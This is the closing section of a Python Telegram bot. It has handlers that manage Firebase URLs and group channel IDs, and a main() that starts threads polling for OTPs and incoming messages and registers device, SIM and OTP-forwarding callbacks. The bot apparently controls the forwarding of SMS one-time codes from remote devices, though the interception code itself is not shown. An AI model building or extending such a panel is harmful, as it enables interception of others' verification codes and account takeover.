async def add_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return WAITING_ADD_GROUP
    if user_id not in user_configs: user_configs[user_id] = {}
    if "additional_groups" not in user_configs[user_id]: user_configs[user_id]["additional_groups"] = []
    if channel_id not in user_configs[user_id]["additional_groups"]:
        user_configs[user_id]["additional_groups"].append(channel_id)
        save_user_configs()
        await update.message.reply_text(f"<b>✅ Group added!</b>\n\nChannel ID: <code>{channel_id}</code>\n\n<b>Support:</b> @MayaXDev", parse_mode='HTML')
    else:
        await update.message.reply_text("<b>⚠️ Group already exists.</b>", parse_mode='HTML')
    await show_main_menu(update, context)
    return ConversationHandler.END

async def del_fb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return ConversationHandler.END
    user_id = str(update.effective_user.id)
    url = update.message.text.strip()
    if user_id in user_configs and "additional_firebase" in user_configs[user_id]:
        if url in user_configs[user_id]["additional_firebase"]:
            user_configs[user_id]["additional_firebase"].remove(url)
            save_user_configs()
            await update.message.reply_text(f"<b>✅ Firebase URL deleted!</b>\n\n<code>{url}</code>", parse_mode='HTML')
        else:
            await update.message.reply_text("<b>❌ Firebase URL not found.</b>", parse_mode='HTML')
    else:
        await update.message.reply_text("<b>❌ No additional Firebase URLs found.</b>", parse_mode='HTML')
    await show_main_menu(update, context)
    return ConversationHandler.END

async def del_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return WAITING_DEL_GROUP
    if user_id in user_configs and "additional_groups" in user_configs[user_id]:
        if channel_id in user_configs[user_id]["additional_groups"]:
            user_configs[user_id]["additional_groups"].remove(channel_id)
            save_user_configs()
            await update.message.reply_text(f"<b>✅ Group deleted!</b>\n\nChannel ID: <code>{channel_id}</code>", parse_mode='HTML')
        else:
            await update.message.reply_text("<b>❌ Group not found.</b>", parse_mode='HTML')
    else:
        await update.message.reply_text("<b>❌ No additional groups found.</b>", parse_mode='HTML')
    await show_main_menu(update, context)
    return ConversationHandler.END

# ============================
# MAIN
# ============================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).build()
    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()
    
    # Setup Firebase Conversation
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("start", start), CallbackQueryHandler(menu_callback_handler, pattern="^menu_setup_firebase$"), CallbackQueryHandler(menu_callback_handler, pattern="^menu_change_firebase$")],
        states={WAITING_FIREBASE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_firebase_url)], WAITING_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel_id)]},
        fallbacks=[CommandHandler("cancel", setup_cancel)]
    ))
    
    # Change Channel Conversation
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_change_channel$")],
        states={WAITING_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel_id)]},
        fallbacks=[CommandHandler("cancel", setup_cancel)]
    ))
    
    # Set OTP Conversation
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_set_forward$"), CommandHandler("setotp", setotp_command)],
        states={WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]},
        fallbacks=[CommandHandler("cancel", otp_cancel)]
    ))
    
    # Add/Del FB & Group Conversations
    app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_add_fb$")], states={WAITING_ADD_FB: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_fb_handler)]}, fallbacks=[CommandHandler("cancel", setup_cancel)]))
    app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_add_group$")], states={WAITING_ADD_GROUP: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_handler)]}, fallbacks=[CommandHandler("cancel", setup_cancel)]))
    app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_del_fb$")], states={WAITING_DEL_FB: [MessageHandler(filters.TEXT & ~filters.COMMAND, del_fb_handler)]}, fallbacks=[CommandHandler("cancel", setup_cancel)]))
    app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_del_group$")], states={WAITING_DEL_GROUP: [MessageHandler(filters.TEXT & ~filters.COMMAND, del_group_handler)]}, fallbacks=[CommandHandler("cancel", setup_cancel)]))
    
    # Other Menu Handlers
    app.add_handler(CallbackQueryHandler(menu_callback_handler, pattern="^menu_"))
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
    
    # Command Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))
    
    # Channel Message Handler
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))
    
    logger.info("🤖 Bot started – with Token Send Confirmation!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()